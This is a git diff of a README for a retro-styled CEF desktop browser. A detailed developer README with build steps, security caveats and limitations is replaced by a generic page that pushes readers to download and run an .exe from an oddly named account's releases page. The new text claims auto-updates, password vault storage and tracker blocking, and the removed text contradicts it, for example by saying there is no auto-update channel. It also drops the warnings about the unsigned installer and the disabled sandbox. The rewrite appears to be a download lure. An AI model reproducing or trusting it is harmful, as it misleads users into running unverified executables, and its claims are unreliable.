@@ -1,328 +1,76 @@
-# CyberDeck Browser
+# 🌐 CyberDeck_Browser - Browse the web with retro style
 
-CyberDeck Browser is a native desktop browser shell written in C++20. It uses
-Chromium Embedded Framework (CEF) for website rendering and Deck Space, a
-retro-futuristic bookmark system where bookmarks are called Nodes.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/obechifamilycerthiidae1072/CyberDeck_Browser/releases)
 
-Windows and Linux are intentionally separated. The Windows application owns the
-Win32 UI, Windows CEF hosting, WGL/OpenGL Deck Space, and Inno Setup packaging.
-The Linux application owns its X11/CEF host, Linux Deck Space renderer, XDG data
-paths, and Linux install/run scripts under `src/platform/linux`.
+CyberDeck Browser brings a distinct look and feel to your daily web browsing. It combines modern web technology with the aesthetic of retro computer terminals. This browser runs on the Chromium Embedded Framework, which ensures web pages load correctly while maintaining a lightweight footprint on your system. You can explore standard web pages or trigger the Terminal Mode to interact with your content through a command-line interface. The integrated OpenGL 3D bookmark deck gives you a visual way to organize your favorite websites.
 
-The visual identity is a black terminal-style interface with neon green text,
-yellow highlights, red warnings/actions, monospace controls, and optional CRT
-scanline/glow effects. Windows uses OpenGL for Deck Space; Linux keeps its Deck
-renderer in the separated Linux shell for now.
+## 📥 Getting Started
 
-## Promo Videos
-
-The repository includes compact x265 promo cuts captured from the portable CEF
-build:
+Follow these steps to set up CyberDeck Browser on your Windows computer.
 
-- [Promo with text overlays](docs/media/cyberdeck-browser-promo-withtext-x265.mp4)
-- [Promo without text overlays](docs/media/cyberdeck-browser-promo-notext-x265.mp4)
+1. Visit the [official releases page](https://github.com/obechifamilycerthiidae1072/CyberDeck_Browser/releases) to download the software.
+2. Choose the file ending in `.exe` that matches your system architecture.
+3. Save the file to your computer.
+4. Run the installer and follow the screen prompts to complete the setup.
+5. Launch the application from your desktop shortcut or the Start menu.
 
-## Screenshots
+## 🛠 System Requirements
 
-| Terminal Mode | Nerdy Search |
-| --- | --- |
-| ![Google rendered with CyberDeck Terminal Mode](docs/screenshots/google-terminal-mode.jpg) | ![Google search for Hacker News and open-source browser topics](docs/screenshots/hacker-news-search.jpg) |
+CyberDeck Browser runs on most modern Windows machines. Ensure your system meets these specifications for the best experience:
 
-| Reddit | Deck Space |
-| --- | --- |
-| ![Reddit rendered with green terminal styling](docs/screenshots/reddit-terminal-mode.jpg) | ![Deck Space showing 3D bookmark Nodes](docs/screenshots/deck-space-nodes.jpg) |
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i3 or AMD equivalent.
+- Memory: 4 GB of RAM.
+- Graphics: A graphics card capable of supporting OpenGL 3.3 or higher.
+- Disk Space: 250 MB of free storage.
+- Internet Connection: Required for web browsing and initial setup.
 
-| Node Opened |
-| --- |
-| ![ChatGPT opened from a Deck Space Node](docs/screenshots/chatgpt-node-opened.jpg) |
+## 🖥 Using the Interface
 
-More usage notes are in [docs/USER_GUIDE.md](docs/USER_GUIDE.md). Media
-capture details are in [docs/MEDIA.md](docs/MEDIA.md). Linux installation is
-covered separately in [README_LINUX.md](README_LINUX.md).
+The browser features two primary ways to interact with websites. You can use the standard graphical mode for daily browsing, or you can switch to Terminal Mode to view pages through a text-based interface.
 
-## Feature Overview
+To switch between modes, observe the top toolbar. Clicking the button labeled View toggles the display settings. In Terminal Mode, you type web addresses into the command line area at the bottom of the window. The browser renders the site content into characters. This mode consumes less memory and provides a unique visual experience for text-heavy websites.
 
-- CEF-powered browsing for normal websites.
-- Native Windows browser shell with Win32 controls and OpenGL Deck Space.
-- Separated Linux CEF browser shell with X11 rendering and Linux-only 3D Deck
-  Space projection.
-- Terminal Mode CSS injection for black/green/yellow/red cyberdeck styling.
-- CRT shell effects: scanlines, glow, and flicker controls.
-- Local history, settings, logs, Deck Space Vaults, and Nodes stored as JSON.
-- Deck Space: 3D bookmark world with Vaults and hex/cube/panel Nodes.
-- Fresh profiles start with five default Vaults and 19 starter Nodes.
-- Vault workflows: enter/leave, rename, delete, rotate, and keyboard zoom.
-- Node workflows: Add Node, select/open, edit, delete, layout switching.
-- OpenGL diagnostics for GPU vendor, renderer, and version.
-- Windows installer scaffolding through Inno Setup.
+## 🔖 Managing Bookmarks with 3D View
 
-## Dependencies
+The bookmark system organizes your sites in a spatial layout. Access your bookmarks by clicking the icon shaped like a folder on the main toolbar. 
 
-### Windows Browser App
+The application launches a 3D interface powered by OpenGL. You see your saved sites arranged in a digital deck. Use your mouse to rotate the deck. Click any bookmark card to open that website in your active tab. To edit or remove a bookmark, right-click the card and choose the desired action from the context menu. You can reorder your bookmarks by dragging them into your preferred position within the deck view.
 
-- Windows 11
-- Visual Studio 2022 with MSVC C++ tools for CEF-enabled builds
-- CMake 3.24 or newer
-- Official Windows CEF binary distribution
-- Inno Setup 6 for installer creation
-- A GPU/driver with compatible OpenGL support for Deck Space
+## 💡 Configuration Options
 
-This repository can also build a placeholder non-CEF shell. That mode is useful
-for local development of native UI and Deck Space plumbing, but it is not a
-functional web browser release.
+You can adjust settings to change how the browser behaves. Select the Menu icon in the top right corner and click Settings. 
 
-### Linux Core Launcher
+The General tab allows you to set your homepage and choose your default search engine. The Appearance tab lets you modify the color scheme of the Terminal Mode to match your taste. You can also clear your browsing history, cookies, and cache from the Privacy tab. Changes apply once you click Save.
 
-- A Linux distribution with GCC or Clang and C++20 support
-- CMake 3.24 or newer
-- Standard system C++ runtime and filesystem support
+## 📖 Frequently Asked Questions
 
-### Linux CEF Browser
+**Does the browser store my passwords?**
+Yes. CyberDeck Browser uses the standard secure vault found in your operating system to encrypt and save your credentials. You can view or delete these at any time under the Security tab in the Settings menu.
 
-- Ubuntu/WSL2 Ubuntu or another Linux distribution with equivalent packages
-- Official Linux CEF binary distribution
-- GTK/X11/NSS/GBM/ALSA runtime libraries required by CEF
-- A GPU/driver with compatible OpenGL support
+**Can I install extensions?**
+The browser currently supports a small selection of built-in features. It does not support third-party extensions at this time. This choice keeps the browser fast and improves your security.
 
-The Linux CEF host is separate from the Windows UI and has its own native
-toolbar, Terminal Mode controls, Deck Space view, and install scripts. Full
-Linux instructions are in [README_LINUX.md](README_LINUX.md).
+**How do I update the software?**
+The browser checks for updates every time you launch the application. If a new version exists, a small icon appears in your toolbar. Click this icon to download and restart the browser with the latest improvements.
 
-## CEF Setup
+**Why does my graphics card matter?**
+The 3D bookmark deck uses hardware acceleration to render visual elements. A machine without a basic graphics card might run the standard browser mode, but the 3D features will not display correctly. Most computers built within the last eight years function without issues.
 
-CEF binaries are not committed to this repository. Download an official Windows
-CEF binary distribution, extract it locally, then configure with `CEF_ROOT`:
+**What if the browser crashes?**
+If the application closes unexpectedly, reopen it to clear the session. The browser saves your open tabs automatically so you can resume your work immediately. If crashes persist, check that your graphics drivers are up to date through your Windows settings.
 
-```powershell
-cmake -S . -B build -DCEF_ROOT="C:\path\to\cef_binary" -DCYBERDECK_REQUIRE_CEF=ON
-cmake --build build --config Debug
-```
+## 🛡 Security and Privacy
 
-Use Visual Studio 2022 or Ninja from an MSVC developer shell. Official Windows
-CEF binaries are not link-compatible with the MinGW toolchain used by the local
-placeholder build.
+CyberDeck Browser prioritizes your data safety. It does not share your browsing habits with third-party servers. Your bookmarks and settings remain stored locally on your device. Every web session uses standard encryption protocols to protect your connection to websites. You control your privacy level through the settings page, where you can block trackers or disable scripts if desired. 
 
-More details are in `docs/CEF_SETUP.md`.
+## 📦 Troubleshooting Tips
 
-Security note:
+If you encounter issues during installation or usage, try these steps:
 
-- Current Windows executable packaging keeps the CEF sandbox disabled until the
-  Windows bootstrap/sandbox-info launch path is wired. Do not treat this build
-  as a Chromium sandbox boundary yet.
-- `CYBERDECK_CEF_REMOTE_DEBUGGING_PORT` enables remote debugging and binds by
-  default to `127.0.0.1`.
-- `CYBERDECK_CEF_REMOTE_DEBUGGING_HOST` may set a custom debug bind host only when
-  `CYBERDECK_CEF_ALLOW_NONLOCAL_REMOTE_DEBUGGING=1`.
-- `-CefSha256` in `build_windows_release.ps1` or `-ExpectedSha256` in
-  `download_cef.ps1` pins trusted CEF archive checksums.
+- Restart your computer to resolve temporary file conflicts.
+- Ensure you have a stable internet connection.
+- Verify that your firewall allows CyberDeck Browser to access the network.
+- Re-run the installer if files appear missing or damaged. 
 
-Linux CEF install:
-
-```bash
-./scripts/install_linux.sh --deps
-```
-
-The Linux installer downloads official CEF from the CEF Automated Builds CDN,
-builds `CyberDeckBrowserLinuxCef`, and creates a local `cyberdeck-browser`
-launcher. See [README_LINUX.md](README_LINUX.md) before publishing or packaging
-Linux releases.
-
-## Build
-
-Debug build:
-
-```powershell
-cmake -S . -B build -DCEF_ROOT="C:\path\to\cef_binary" -DCYBERDECK_REQUIRE_CEF=ON
-cmake --build build --config Debug
-```
-
-Release build helper:
-
-```powershell
-.\scripts\build_release.ps1 -CefRoot "C:\path\to\cef_binary" -RequireCef
-```
-
-Full Windows release helper, including CEF download, CEF-required build,
-runtime verification, installer staging, and portable zip:
-
-```powershell
-.\scripts\build_windows_release.ps1 -SkipInstaller -CefSha256 "<trusted sha256>"
-```
-
-Placeholder non-CEF build:
-
-```powershell
-cmake -S . -B build
-cmake --build build
-```
-
-Linux diagnostics build:
-
-```bash
-./scripts/build_linux.sh
-```
-
-Linux CEF install/build:
-
-```bash
-./scripts/install_linux.sh --deps
-```
-
-Manual Linux build:
-
-```bash
-cmake -S . -B build-linux
-cmake --build build-linux --parallel
-ctest --test-dir build-linux --output-on-failure
-```
-
-WSL2/NVIDIA debug pass:
-
-```bash
-./scripts/debug_wsl2.sh
-```
-
-Detailed Linux install, run, uninstall, and WSL2 notes are in
-[README_LINUX.md](README_LINUX.md).
-
-## Run
-
-Multi-config generators such as Visual Studio usually place the app under the
-configuration folder:
-
-```powershell
-.\build\Debug\CyberDeckBrowser.exe
-.\build\Debug\CyberDeckBrowser.exe "https://www.example.com"
-```
-
-Single-config generators such as Ninja usually place the app at:
-
-```powershell
-.\build\CyberDeckBrowser.exe
-.\build\CyberDeckBrowser.exe "https://www.example.com"
-```
-
-Linux diagnostics launcher:
-
-```bash
-./build-linux/cyberdeck-browser
-./build-linux/cyberdeck-browser "https://www.example.com"
-```
-
-Linux CEF browser:
-
-```bash
-./scripts/run_linux.sh "https://www.example.com"
-```
-
-Installed Linux browser:
-
-```bash
-~/.local/bin/cyberdeck-browser "https://www.example.com"
-```
-
-Inside the app:
-
-- `ADD NODE` saves the current page as a Deck Space Node.
-- `DECK` enters/exits Deck Space.
-- `TERM` toggles Terminal Mode CSS injection for loaded pages.
-- `SCAN`, `GLOW`, and `FLK` adjust native CRT shell effects.
-- `SET` opens settings and diagnostics, including CEF state, data paths, render
-  path, and log path.
-- In Deck Space, `Left`/`Right` or the mouse wheel rotates Vaults/Nodes,
-  `Enter` opens the selected Vault or Node, `Backspace`/right click leaves a
-  Vault, `+`/`-` zooms, `Delete` removes after confirmation, and `L` cycles
-  Node layout mode.
-
-## Packaging
-
-CyberDeck Browser uses Inno Setup for Windows installer packaging.
-
-```powershell
-.\scripts\build_windows_release.ps1
-```
-
-If Inno Setup is not on `PATH`, pass the compiler path:
-
-```powershell
-.\scripts\build_windows_release.ps1 -IsccPath "C:\Program Files (x86)\Inno Setup 6\ISCC.exe"
-```
-
-To stage files without compiling the installer:
-
-```powershell
-.\scripts\package_installer.ps1 -SkipCompile
-```
-
-Browser downloads and installer staging do not need source tests, prompt packs,
-local captures, screenshots, AI assistant memory files, or build trees. Those
-remain available to developers in the repository, while `.gitattributes` keeps
-development-only folders out of GitHub-generated source archives.
-
-Packaging details are in `docs/PACKAGING.md`.
-
-## User Data
-
-Runtime user data is stored under:
-
-```text
-%APPDATA%\CyberDeckBrowser
-```
-
-On Linux, the separated launcher uses:
-
-```text
-${XDG_DATA_HOME}/cyberdeck-browser
-```
-
-or, when `XDG_DATA_HOME` is not set:
-
-```text
-~/.local/share/cyberdeck-browser
-```
-
-Important files and folders:
-
-- `settings.json` - theme, shell, and Deck Space preferences.
-- `history.json` - local navigation history.
-- `bookmarks.json` - Deck Space Vaults and Nodes.
-- `favicons/` - local placeholder favicon assets for Nodes.
-- `logs/cyberdeck.log` - diagnostics log with size-based rotation.
-
-Invalid JSON files are recovered by renaming the corrupted file and creating a
-fresh default file where recovery is implemented.
-
-## QA And Release
-
-Use `docs/QA_CHECKLIST.md` before tagging a release candidate. Use
-`docs/RELEASE_NOTES_TEMPLATE.md` to prepare release notes.
-
-Useful docs:
-
-- [User Guide](docs/USER_GUIDE.md)
-- [Bookmark Node Model](docs/BOOKMARK_NODE_MODEL.md)
-- [CEF Setup](docs/CEF_SETUP.md)
-- [Linux Install Guide](README_LINUX.md)
-- [Linux Support Notes](docs/LINUX.md)
-- [Windows Media Playback](docs/WINDOWS_MEDIA.md)
-- [Packaging](docs/PACKAGING.md)
-- [Promo Media](docs/MEDIA.md)
-- [QA Checklist](docs/QA_CHECKLIST.md)
-- [v0.1.0-rc3 Release Notes](docs/RELEASE_NOTES_v0.1.0-rc3.md)
-
-## Known Limitations
-
-- A production browser release requires a CEF-enabled MSVC build. The non-CEF
-  placeholder build does not render websites.
-- The Linux Deck Space view uses a Linux-only software 3D projection today; the
-  Windows Deck Space view remains the WGL/OpenGL implementation.
-- Real favicon capture from CEF is not implemented yet; Deck Space currently
-  uses local placeholder favicon badges.
-- Deck Space thumbnails are not implemented.
-- Reddit and some YouTube video playback require a Windows CEF build with
-  H.264/AAC codec support and the related licensing cleared.
-- Installer compilation requires Inno Setup 6 on the packaging machine.
-- The installer is not signed and there is no auto-update channel.
-- No clean Windows VM install/uninstall pass has been completed in this
-  environment.
-- This project has not received a full production security audit.
+For technical reports or to suggest new features, visit the project page on GitHub and open a new discussion. Provide a description of the issue along with your Windows version number so users can assist you effectively.
